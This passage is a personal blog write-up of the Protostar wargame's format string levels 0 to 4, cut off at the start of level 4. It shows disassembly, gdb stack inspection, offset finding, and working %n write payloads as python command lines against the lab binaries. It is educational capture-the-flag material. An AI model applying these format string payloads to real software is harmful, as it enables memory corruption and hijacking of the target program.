<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Format String levels">
  <title>Exploit Exercises - Protostar - Format String levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the format string exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="1301">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Format String levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://localhost:1313/blog/2014/09/Exploit-Exercises---Protostar---Format-String-levels/" />
  

  
  <meta property="og:updated_time" content="2014-09-16 13:21:27 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Format String levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
  <link href="http://localhost:1313//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://localhost:1313//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://localhost:1313//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://localhost:1313//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.18.1" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://localhost:1313//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://localhost:1313/</h2>
					
					<li><a href="http://localhost:1313/about">About </a></li>
					
					<li><a href="http://localhost:1313/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://localhost:1313//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://localhost:1313/about">About </a></li>
					
						<li><a href="http://localhost:1313/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Format String levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-09-16</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="format-0">Format 0</h1>

<p>First of all, we take a look at the disassembly.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x08048431</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08048434</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>    <span class="p">;</span> <span class="n">load</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">first</span> <span class="n">argument</span>
<span class="mh">0x08048437</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">increment</span> <span class="n">to</span> <span class="n">get</span> <span class="n">to</span> <span class="n">the</span> <span class="n">pointer</span> <span class="n">of</span> <span class="n">the</span> <span class="n">second</span> <span class="n">argument</span>
<span class="mh">0x0804843a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span> <span class="n">resolve</span> <span class="n">pointer</span><span class="o">-</span><span class="n">pointer</span>
<span class="mh">0x0804843c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>       <span class="p">;</span> <span class="n">store</span> <span class="n">at</span> <span class="n">adress</span> <span class="n">of</span> <span class="n">esp</span>
<span class="mh">0x0804843f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483f4</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">&gt;</span>
<span class="p">...</span>
<span class="mh">0x080483fa</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x08048401</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048404</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048408</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x4c</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">load</span> <span class="n">address</span> <span class="n">of</span> <span class="n">target</span> <span class="n">buffer</span>
<span class="mh">0x0804840b</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>              <span class="p">;</span> <span class="n">load</span> <span class="n">address</span> <span class="n">of</span> <span class="n">second</span> <span class="n">argument</span>
<span class="hll"><span class="mh">0x0804840e</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048300</span> <span class="o">&lt;</span><span class="n">sprintf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class="mh">0x08048413</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048416</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;:</span>   <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0xdeadbeef</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804841b</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">39</span><span class="o">&gt;:</span>   <span class="n">jne</span>    <span class="mh">0x8048429</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;</span>
<span class="mh">0x0804841d</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048510</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048424</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048330</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>So this program takes a startup argument.
This input is then utilized in the sprintf at 0x0804840e.
So to exploit this sample we have to perform a format string attack.
The format string variable is located at EBP-0x4c.
The variable for the challenge relevant comparison is located at EBP-0xc.
So we need to write 64 bytes to align the payload of 0xdeadbeef.
To write 64 bytes the format string expression %64x will suffice.
Finally, we can complete the level with the following command.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$ /opt/protostar/bin/format0 $</span><span class="o">(</span>python -c <span class="s1">&#39;print &quot;%64x&quot;+ &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="o">)</span>
<span class="go">you have hit the target correctly :)</span>
</code></pre></div>
</p>

<h1 id="format-1">Format 1</h1>

<p>In this scenario we have to manipulate a specific location on the heap.
Let&rsquo;s examine the vuln function to get a better idea.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x080483fa</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<span class="mh">0x080483fd</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x08048400</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048320</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="hll"><span class="mh">0x08048405</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049638</span>
</span><span class="mh">0x0804840a</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;:</span>   <span class="n">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x0804840c</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;:</span>   <span class="n">je</span>     <span class="mh">0x804841a</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;</span>
<span class="mh">0x0804840e</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8048500</span>
<span class="mh">0x08048415</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048330</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>The location in question is 0x08049638.
The variable is located in the .data section, indicating a global variable.</p>

<p>Like the previous example the user can supply an argument for printf.
This type of printf vulnerability allows direct parameter access.
To overwrite the target we have to find the correct offset to skip.
We can calculate rough estimate by looking at the following addresses.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff5f0</span><span class="o">:</span>     <span class="mh">0xbffff843</span>      <span class="mh">0x0804960c</span>      <span class="mh">0xbffff628</span>      <span class="mh">0x08048469</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">s</span> <span class="mh">0xbffff843</span>
<span class="mh">0xbffff843</span><span class="o">:</span>      <span class="s">&quot;AAAA&quot;</span>
</code></pre></div>


<p>The required offset will be at round 0x141 bytes (0xbffff843 - 0xbffff5f0).
This makes for about 149 words to skip.
To get an exact number we can utilize the following command.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format1 $</span><span class="o">(</span>python -c <span class="s1">&#39;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,150)])&#39;</span><span class="o">)</span>
<span class="go">... 143:74616d72.144:41410031.145:3a314141.146:322e7825 ...</span>
</code></pre></div>


<p>So the address is aligned between words 144 and 145.
With an alignment we have identified the correct offset.
The respective command to complete the level is as follows.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$ //opt/protostar/bin/format1 $</span><span class="o">(</span>python -c <span class="s1">&#39;print &quot;\x38\x96\x04\x08%144$n&quot;&#39;</span><span class="o">)</span>
</code></pre></div>


<h1 id="format-2">Format 2</h1>

<p>This example is based on the previous level 1.
First, we will take a look at the relevant parts of the assembly.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x0804846e</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x208</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048474</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048477</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804835c</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804847c</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x208</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048482</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048485</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804837c</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804848a</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x80496e4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804848f</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;:</span>   <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x40</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048492</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;:</span>   <span class="n">jne</span>    <span class="mh">0x80484a2</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>Once again, we have to calculate the correct offset.
For the estimate we take a look at the stack during runtime.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff410</span><span class="o">:</span>     <span class="mh">0xbffff420</span>      <span class="mh">0x00000200</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">s</span> <span class="mh">0xbffff420</span>
<span class="mh">0xbffff420</span><span class="o">:</span>      <span class="s">&quot;aaa</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0xbffff425</span><span class="o">:</span>      <span class="s">&quot;&quot;</span>
</code></pre></div>


<p>This makes for an offset of 0x10 bytes.
We calculate the exact offset with previously discussed the method.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> python -c <span class="s1">&#39;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,10)])&#39;</span> <span class="p">|</span> /opt/protostar/bin/format2
<span class="go">AAAA1:200.2:b7fd8420.3:bffff464.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a</span>
<span class="go">target is 0 :(</span>
</code></pre></div>


<p>Now we only need to go back 4 words to access to desired memory location.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$</span> python -c <span class="s1">&#39;print &quot;\xe4\x96\x04\x08%4$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format2

<span class="go">target is 4 :(</span>
</code></pre></div>


<p>The problem is, that we still need to set the value to 0x40.
In fact printf stores the number of written bytes at the target offset.
So we simply increase output size and voila:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$</span> python -c <span class="s1">&#39;print &quot;\xe4\x96\x04\x08%52x%x%4$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format2
<span class="go">                                                 200b7fd8420</span>
<span class="go">you have modified the target :)</span>
</code></pre></div>


<h1 id="format-3">Format 3</h1>

<p>This example is once again based on the previous level.
Let&rsquo;s examine the changes in assembly for starters.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x0804845a</span> <span class="o">&lt;</span><span class="n">printbuffer</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>     <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804845d</span> <span class="o">&lt;</span><span class="n">printbuffer</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>     <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048460</span> <span class="o">&lt;</span><span class="n">printbuffer</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;:</span>    <span class="n">call</span>   <span class="mh">0x804837c</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
<span class="mh">0x08048475</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048479</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x200</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048481</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x208</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048487</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804848a</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804835c</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804848f</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x208</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048495</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048498</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048454</span> <span class="o">&lt;</span><span class="n">printbuffer</span><span class="o">&gt;</span>
<span class="mh">0x0804849d</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x80496f4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484a2</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;:</span>   <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x1025544</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484a7</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="n">jne</span>    <span class="mh">0x80484b7</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>The fgets() call is restricted with a length restriction.
Also, the printf() function is encapsulated in a function call.
Finally, to complete the level the the global variable at 0x080496f4 has to be manipulated.
The value has to be set to 0x01025544.</p>

<p>We try to narrow down the correct offset to access the target memory location.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff3f0</span><span class="o">:</span>     <span class="mh">0xbffff420</span>      <span class="mh">0x00000000</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">s</span> <span class="mh">0xbffff420</span>
<span class="mh">0xbffff420</span><span class="o">:</span>      <span class="s">&quot;aaaa%x</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0xbffff428</span><span class="o">:</span>      <span class="s">&quot;$</span><span class="se">\365\377\267</span><span class="s">&quot;</span>
</code></pre></div>


<p>This makes for an offset of 0x10 bytes.
We calculate the exact offset with previously discussed the method.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> python -c <span class="s1">&#39;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,15)])&#39;</span><span class="sb">`</span><span class="s2">&quot; | /opt/protostar/bin/format3</span>
<span class="go">AAAA1:0.2:bffff420.3:b7fd7ff4.4:0.5:0.6:bffff628.7:804849d.8:bffff420.9:200.10:b7fd8420.11:bffff464.12:41414141.13:78253a31.14:253a322e</span>
<span class="go">target is 00000000 :(</span>
</code></pre></div>


<p>So the respective command to overwrite the target buffer is as follows.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> python -c <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;+&quot;%12$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format3

<span class="go">target is 00000004 :(</span>
</code></pre></div>


<p>The required value in the target buffer cannot be set with one write operation.
The simplest way is to set every byte seperatly.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> python -c <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf5\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;\xf7\x96\x04\x08&quot;+&quot;%01x%12$n&quot;+&quot;%17x%13$n&quot;+&quot;%17x%14$n&quot;+&quot;%17x%15$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format3
<span class="go">���0         bffff420         b7fd7ff4                0</span>
<span class="go">target is 44332211 :(</span>
</code></pre></div>


<p>Now we just have to adjust every offset to match the desired value.
To do this, we adjust the printed bytes before every write to memory.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> python -c <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf5\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;\xf7\x96\x04\x08&quot;+&quot;%52x%12$n&quot;+&quot;%17x%13$n&quot;+&quot;%173x%14$n&quot;+&quot;%255x%15$n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/format3
<span class="go">...</span>
<span class="go">you have modified the target :)</span>
</code></pre></div>


<h1 id="format-4">Format 4</h1>

<p>For this exercise we have to manipulation the execution flow.
In partiuclar, we have to execute the hello() function at 0x080484b4.
The assembly directly points out where we have to start working.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x080484b4</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>   <span class="n">push</span>   <span class="n">ebp</span>
<span class="mh">0x080484b5</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
<span class="mh">0x080484b7</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>   <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x18</span>
<span class="mh">0x080484ba</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x80485f0</span>
<span class="mh">0x080484c1</span> <span class="o">&lt;</span><span class="n">hello</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x80483dc</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
